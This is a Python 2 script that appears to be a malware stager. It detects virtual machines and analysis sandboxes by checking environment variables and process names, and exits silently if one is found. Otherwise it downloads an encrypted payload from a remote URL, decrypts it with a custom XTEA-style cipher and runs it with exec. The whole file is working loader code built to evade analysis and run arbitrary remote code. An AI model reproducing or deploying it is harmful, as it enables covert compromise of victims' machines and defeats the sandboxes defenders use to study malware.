#!/usr/bin/python
import os
import sys
import struct
import base64
import urllib
import logging

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG if bool('--debug' in sys.argv or 'debug' in sys.argv) else logging.ERROR)
logger.addHandler(logging.StreamHandler())

def decrypt(data, key, block_size=8, key_size=16, num_rounds=32):
    try:
        data    = base64.b64decode(data)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            s   = (d * 32) & m
            for _ in xrange(num_rounds):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                s   = (s - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return bytes().join(result).rstrip(chr(0))
    except Exception as e:
        logger.error("{} returned error: {}".format(decrypt.func_name, str(e)))

def environment():
    try:
        environment = [key for key in os.environ if 'VBOX' in key]
        processes   = [i.split()[0 if os.name == 'nt' else -1] for i in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if i.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        return bool(environment + processes)
    except Exception as e:
        logger.error("{} returned error: {}".format(environment.func_name, str(e)))

def run(url, key):
    global logger
    try:
        logger.info("Checking environment...")
        if environment():
            if globals()['_debug']:
                if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
                    sys.exit(0)
            else:
                sys.exit(0)
        logger.info("Decrypting payload...")
        payload = decrypt(urllib.urlopen(str(url)).read(), base64.b64decode(str(key)))
        logger.info("Starting client...")
        exec payload in globals()
    except Exception as e:
        logger.error("{} returned error: {}".format(run.func_name, str(e)))
